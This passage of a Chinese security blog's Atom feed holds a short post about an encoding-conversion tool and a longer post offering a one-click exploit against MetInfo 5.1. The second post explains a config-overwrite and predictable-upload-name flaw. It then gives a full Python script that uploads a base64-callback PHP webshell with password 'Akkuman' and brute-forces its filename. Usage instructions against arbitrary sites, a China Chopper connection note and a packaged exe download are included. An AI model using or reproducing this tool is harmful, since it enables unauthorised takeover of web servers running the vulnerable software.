    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>编码转换工具</title>
    <link href="http://hacktech.cn/2016/06/09/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7/"/>
    <id>http://hacktech.cn/2016/06/09/编码转换工具/</id>
    <published>2016-06-09T14:41:55.000Z</published>
    <updated>2016-10-29T06:59:46.298Z</updated>
    
    <content type="html"><![CDATA[<p><strong>闲来无事，写了款编码转换工具</strong></p>
<p><strong>以我的审美来看，界面应该算美丽</strong></p>
<hr>
<p><strong>截图 :</strong></p>
<hr>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.png" alt="Akkuman"><br><a id="more"></a></p>
<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><p><a href="http://cloud.189.cn/t/yueaMb7VnmAb" target="_blank" rel="external"><strong>编码转换工具</strong></a></p>
<p><em>转载请注明出处</em></p>
<p><em>作者博客 53xiaoshou.com | hacktech.cn</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;闲来无事，写了款编码转换工具&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以我的审美来看，界面应该算美丽&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;截图 :&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;img src=&quot;http://7xusrl.com1.z0.glb.clouddn.com/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.png&quot; alt=&quot;Akkuman&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://hacktech.cn/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>MetInfo V5.1 GetShell一键化工具</title>
    <link href="http://hacktech.cn/2016/06/08/MetInfo-V5-1-GetShell%E4%B8%80%E9%94%AE%E5%8C%96%E5%B7%A5%E5%85%B7/"/>
    <id>http://hacktech.cn/2016/06/08/MetInfo-V5-1-GetShell一键化工具/</id>
    <published>2016-06-08T14:40:32.000Z</published>
    <updated>2016-10-29T07:07:05.903Z</updated>
    
    <content type="html"><![CDATA[<hr>
<h1 id="漏洞解析："><a href="#漏洞解析：" class="headerlink" title="漏洞解析："></a>漏洞解析：</h1><hr>
<p><strong>config/config.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$langoks = $db-&gt;get_one(<span class="string">"SELECT * FROM $met_lang WHERE lang='$lang'"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks)<span class="keyword">die</span>(<span class="string">'No data in the database,please reinstall.'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks[useok]&amp;&amp;!$metinfoadminok)okinfo(<span class="string">'../404.html'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(count($met_langok)==<span class="number">1</span>)$lang=$met_index_type;</div><div class="line"></div><div class="line">$query = <span class="string">"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'"</span>;<span class="comment">//看这里</span></div><div class="line"></div><div class="line">$result = $db-&gt;query($query);</div><div class="line"></div><div class="line"><span class="keyword">while</span>($list_config= $db-&gt;fetch_array($result))&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($metinfoadminok)$list_config[<span class="string">'value'</span>]=str_replace(<span class="string">'"'</span>, <span class="string">'&amp;#34;'</span>, str_replace(<span class="string">"'"</span>, <span class="string">'&amp;#39;'</span>,$list_config[<span class="string">'value'</span>]));</div><div class="line"></div><div class="line">	$settings_arr[]=$list_config;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($list_config[<span class="string">'columnid'</span>])&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>].<span class="string">'_'</span>.$list_config[<span class="string">'columnid'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">@extract($settings);</div></pre></td></tr></table></figure></p>
<hr>
<a id="more"></a>
<p>访问</p>
<p><a href="http:///localhost/metinfo5.1/index.php?lang=metinfo" target="_blank" rel="external">http:///localhost/metinfo5.1/index.php?lang=metinfo</a></p>
<p><code>SELECT * FROM met_config WHERE lang=&#39;metinfo&#39; or lang=&#39;metinfo&#39;</code></p>
<hr>
<h2 id="文件命名方式："><a href="#文件命名方式：" class="headerlink" title="文件命名方式："></a>文件命名方式：</h2><hr>
<p><strong>/feedback/uploadfile_save.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">srand((double)microtime() * <span class="number">1000000</span>);</div><div class="line"></div><div class="line">$rnd = rand(<span class="number">100</span>, <span class="number">999</span>);</div><div class="line"></div><div class="line">$name = date(<span class="string">'U'</span>) + $rnd;</div><div class="line"></div><div class="line">$name = $name.<span class="string">"."</span>.$ext;</div></pre></td></tr></table></figure></p>
<p><strong>文件保存在/upload/file/目录</strong></p>
<p>命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数</p>
<p>可爆破：</p>
<p>如</p>
<p><a href="http://127.0.0.1/upload/file/1465394396.php" target="_blank" rel="external">http://127.0.0.1/upload/file/1465394396.php</a></p>
<hr>
<h1 id="一键化利用工具："><a href="#一键化利用工具：" class="headerlink" title="一键化利用工具："></a>一键化利用工具：</h1><hr>
<p><strong>本程序基于python编写</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"></div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'</span>&#125;</div><div class="line"></div><div class="line">urls = Queue.Queue()</div><div class="line"><span class="comment">#http://hb.jhxjd.com/upload/file/1441445378.php</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">(urls,time_out)</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> urls.empty():</div><div class="line">        base_url = urls.get()</div><div class="line">        response = <span class="keyword">None</span></div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            time.sleep(int(time_out))<span class="comment">#延时设置</span></div><div class="line">            response = requests.get(base_url,headers=headers)</div><div class="line">            <span class="keyword">if</span> response.status_code == <span class="number">404</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'Not Fount----%s\n'</span> % base_url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            <span class="keyword">if</span> response:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'url.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(<span class="string">'%s?e=YXNzZXJ0\n'</span>%base_url)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_url,thread_num,time_out)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#取出当前时间戳并删除后四位</span></div><div class="line">    now = str(int(time.time()))[:<span class="number">-4</span>]</div><div class="line"></div><div class="line">    <span class="comment">#将所有的待爆破地址遍历并加入队列</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</div><div class="line">            num_str = <span class="string">''</span>.join((str(i),str(j)))</div><div class="line">            url = <span class="string">''</span>.join((<span class="string">'%s/upload/file/%s'</span> % (target_url,now),num_str,<span class="string">'.php'</span>))</div><div class="line">            urls.put(url)</div><div class="line"></div><div class="line">    <span class="comment">#上传文件</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'xiaoma.php'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> fi:</div><div class="line">        fi.write(<span class="string">"&lt;?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?&gt;"</span>)</div><div class="line">    data = &#123;</div><div class="line">            <span class="string">'fd_para[1][para]'</span>:<span class="string">'filea'</span>,</div><div class="line">            <span class="string">'fd_para[1][type]'</span>:<span class="string">'5'</span></div><div class="line">            &#125;</div><div class="line">    files = &#123;<span class="string">'filea'</span>: open(<span class="string">"xiaoma.php"</span>, <span class="string">'rb'</span>)&#125;</div><div class="line">    upload_url = <span class="string">'%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo'</span> % target_url</div><div class="line">    res = requests.post(upload_url,data = data,files=files)</div><div class="line">    <span class="comment">#等待两秒  文件上传</span></div><div class="line">    time.sleep(<span class="number">2</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">#启动多线程</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(thread_num)):</div><div class="line">        t = threading.Thread(target = bp,args=(urls,time_out,))</div><div class="line">        t.start()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Example : %s http://www.xxx.com 20 0'</span> % sys.argv[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        main(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>])</div></pre></td></tr></table></figure>
<p>程序略显粗糙</p>
<p>为了方便，我也把他打包成了<strong>exe</strong></p>
<p>然后闲着没事，想着简单地给他做了个<strong>界面</strong>,这样的<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png" alt="GUI"></p>
<hr>
<h1 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h1><hr>
<blockquote>
<p>MetInfo V5.1上传漏洞getshell利用工具</p>
<p>   作者 : Akkuman</p>
<p>漏洞原理详见<a href="http://www.wooyun.org/bugs/wooyun-2010-0139168" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0139168</a></p>
<p>使用说明：<br>本目录有两个文件，一个py，一个exe<br>因为exe是py文件打包而成，故文件较大<br>64位系统测试使用通过</p>
<p>如果你安装了py2.x环境  py文件使用方法<br>打开cmd<br>python baopo.py <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
<p>exe命令行文件使用方法<br>打开cmd<br>baopo.exe <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
<p>GUI程序，应该不用说</p>
<p>关于getshell与结果<br>上传的是回调一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="meta">&lt;?php</span> &gt;$e=$_REQUEST[<span class="string">'e'</span>];register_shutdown_function(base64_decode($e),$_&gt;REQUEST[<span class="string">'Akkuman'</span>]);<span class="meta">?&gt;</span></div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
<p>菜刀连接，密码是Akkuman</p>
<p>爆破结果会生成在<strong>url.txt</strong></p>
</blockquote>
<hr>
<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><hr>
<p><a href="http://cloud.189.cn/t/v263QbMJVJ3u" target="_blank" rel="external">(访问码:1475)</a></p>
<p><em>转载请注明出处</em></p>
<p><em>作者博客 hacktech.cn | 53xiaoshuo.com</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
&lt;h1 id=&quot;漏洞解析：&quot;&gt;&lt;a href=&quot;#漏洞解析：&quot; class=&quot;headerlink&quot; title=&quot;漏洞解析：&quot;&gt;&lt;/a&gt;漏洞解析：&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;config/config.inc.php&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$langoks = $db-&amp;gt;get_one(&lt;span class=&quot;string&quot;&gt;&quot;SELECT * FROM $met_lang WHERE lang=&#39;$lang&#39;&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!$langoks)&lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;No data in the database,please reinstall.&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!$langoks[useok]&amp;amp;&amp;amp;!$metinfoadminok)okinfo(&lt;span class=&quot;string&quot;&gt;&#39;../404.html&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(count($met_langok)==&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)$lang=$met_index_type;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$query = &lt;span class=&quot;string&quot;&gt;&quot;SELECT * FROM $met_config WHERE lang=&#39;$lang&#39; or lang=&#39;metinfo&#39;&quot;&lt;/span&gt;;&lt;span class=&quot;comment&quot;&gt;//看这里&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$result = $db-&amp;gt;query($query);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;($list_config= $db-&amp;gt;fetch_array($result))&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($metinfoadminok)$list_config[&lt;span class=&quot;string&quot;&gt;&#39;value&#39;&lt;/span&gt;]=str_replace(&lt;span class=&quot;string&quot;&gt;&#39;&quot;&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;#34;&#39;&lt;/span&gt;, str_replace(&lt;span class=&quot;string&quot;&gt;&quot;&#39;&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;#39;&#39;&lt;/span&gt;,$list_config[&lt;span class=&quot;string&quot;&gt;&#39;value&#39;&lt;/span&gt;]));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	$settings_arr[]=$list_config;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($list_config[&lt;span class=&quot;string&quot;&gt;&#39;columnid&#39;&lt;/span&gt;])&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		$settings[$list_config[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;].&lt;span class=&quot;string&quot;&gt;&#39;_&#39;&lt;/span&gt;.$list_config[&lt;span class=&quot;string&quot;&gt;&#39;columnid&#39;&lt;/span&gt;]]=$list_config[&lt;span class=&quot;string&quot;&gt;&#39;value&#39;&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;		$settings[$list_config[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;]]=$list_config[&lt;span class=&quot;string&quot;&gt;&#39;value&#39;&lt;/span&gt;];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;@extract($settings);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
</feed>
